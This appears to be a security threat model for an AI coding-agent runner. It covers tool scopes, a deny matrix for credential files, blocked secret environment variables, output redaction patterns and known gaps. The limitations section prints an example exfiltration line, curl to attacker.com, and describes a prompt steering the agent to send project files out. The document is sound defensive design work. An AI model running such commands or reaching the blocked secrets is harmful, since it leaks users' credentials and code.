# Runner Threat Model

## What the model can touch

| Category     | Tools                                                  | Scope                                                                                                                                                                                                          |
| ------------ | ------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Read**     | `list_files`, `read_file`, `search_text`, `git_status` | Any file inside `cwd` (and its subdirectories) that passes the deny matrix. Git metadata only.                                                                                                                 |
| **Write**    | `edit_file`, `write_file`, `apply_patch`               | Any file inside `cwd` that passes the deny matrix. Backups saved before mutation. Requires user confirmation (or `--accept-edits`).                                                                            |
| **Recovery** | `undo`, `undo_edit`                                    | Restore files from `.bridge-runner/backups/` or the in-memory undo log. Auto-approved.                                                                                                                         |
| **Shell**    | `bash`                                                 | Run shell commands inside `cwd`. **Opt-in only** (`--allow-shell`). Bounded by timeout (default 30s) and output limits (10KB). Filtered environment. Shell argument scanning blocks dangerous path references. |

## What the model can NEVER touch

These are enforced at the permission layer **before any tool executes**. No CLI flag can override them.

### Secret files (deny matrix)

Path patterns that are **always denied** for both read and write:

| Pattern             | Examples blocked                               |
| ------------------- | ---------------------------------------------- |
| `.env` files        | `.env`, `.env.local`, `.env.production`        |
| SSH/credential dirs | `.ssh/`, `.aws/`, `.claude/`, `.gnupg/`        |
| Private keys        | `id_rsa`, `id_ed25519`, `*.pem`, `*.key`       |
| Credential files    | `credentials*.json`, `*.netrc`, `*.npmrc`      |
| Token files         | Files matching `token*`, `*_token`, `*secret*` |
| System dirs         | `.git/`, `node_modules/`                       |

### Path escapes

- **Absolute paths** (`/etc/passwd`) → denied before realpath check
- **`../` traversal** that escapes `cwd` → caught by realpath containment
- **Symlink escapes** → `fs.realpathSync` resolves the true path and checks against `cwd`

### Shell restrictions (when `bash` is enabled)

- **Blocked path patterns** in command text: `.env`, `.ssh/`, `.aws/`, `.claude/`, `.gnupg/`, `id_rsa`, `id_ed25519`, `*.pem`, `*.key`
- **Blocked env var references**: `$ANTHROPIC_API_KEY`, `$AWS_ACCESS_KEY_ID`, `$GH_TOKEN`, `$SSH_AUTH_SOCK` (and braced `${}` variants)
- **Filtered environment**: `execSync` runs with scrubbed `process.env` — no `AWS_*`, `ANTHROPIC_*`, `CLAUDE_*`, `OPENAI_*`, `GH_TOKEN`, `NPM_TOKEN`, or `SSH_AUTH_SOCK`

## How protections compose

```
User prompt
  → validateCwd() rejects system dirs and non-existent paths
  → Agent loop sends request to bridge
  → Model returns tool_use blocks
  → permissions.check():
      1. confinePath() — realpath containment → deny on escape
      2. isPathBlockedByDenyMatrix() — glob patterns → deny on match
      3. Shell arg scanning — command text inspection → deny on pattern
      4. Category-based decision — allow/ask/deny
  → If ask: user confirms interactively
  → tool.execute() runs with:
      - safeEnv for shell commands (stripped process.env)
      - cwdRealpath confinement
  → runAndScrub() redacts secrets from result text
  → Result flows into messages, transcript, stream-json
```

## Secret redaction (defense in depth)

Even if a blocked file is somehow read, the **result text** passes through `scrubSecrets()` before reaching:

- Upstream messages (the model never sees raw secrets)
- Transcript logs (JSONL on disk)
- stream-json output (stdout)
- JSON output (stdout)

Redacted patterns:

| Original                                 | Redacted as                    |
| ---------------------------------------- | ------------------------------ |
| `sk-ant-...` (Anthropic keys)            | `[REDACTED:anthropic_key]`     |
| `sk-...` (OpenAI keys)                   | `[REDACTED:openai_key]`        |
| `-----BEGIN ... PRIVATE KEY-----` blocks | `[REDACTED:private_key_block]` |
| `ghp_...` / `gho_...` (GitHub tokens)    | `[REDACTED:github_token]`      |
| `AKIA...` (AWS access keys)              | `[REDACTED:aws_access_key]`    |
| `Bearer ...` (OAuth tokens)              | `Bearer [REDACTED]`            |
| `eyJ...` (JWTs)                          | `[REDACTED:jwt]`               |
| `SECRET=...` / `TOKEN=...` assignments   | `*= [REDACTED]`                |

## Known limitations

### 1. No outbound network restriction

The `bash` tool can make outbound HTTP requests (`curl`, `wget`, `nc`). There is no egress filtering at the socket or process level. A determined prompt could exfiltrate project files via `curl -d @secret.txt https://attacker.com`.

**Mitigation in place:** File-level deny matrix prevents reading `.env`, `.ssh/`, `.aws/`, key files. Shell arg scanning rejects obvious attempts to reference these paths. But the model could read a non-blocked file (e.g., `src/config.js`) and `curl` its contents.

**Recommended for future:** Add `--no-network` flag that sets `http_proxy=none` or blocks outbound at the `child_process` level.

### 2. File size unbounded read

`read_file` has configurable `max_bytes`/`max_lines` defaults (50KB/1000 lines), but the model can override them. A 10GB file would exhaust Node's memory.

**Mitigation in place:** None. The tool trusts the model to respect the defaults.

**Recommended for future:** Enforce a hard cap (e.g., 10MB) regardless of the model's requested limits.

### 3. Shell output size unbounded

`bash` tool output is truncated at 10,000 characters in display, but the underlying `execSync` can buffer up to 10MB. A command like `yes | head -c 10000000` would consume memory.

**Mitigation in place:** `maxBuffer: 10MB` on `execSync`. OOM is unlikely but possible.

### 4. No rate limiting on tool calls

The model can make unlimited tool calls within `max_steps`. There's no per-second or per-minute rate limit on shell commands.

### 5. Transcript contains source code

Transcript JSONL files include tool results (file contents, shell output). These contain project source code. Treat transcripts as sensitive.
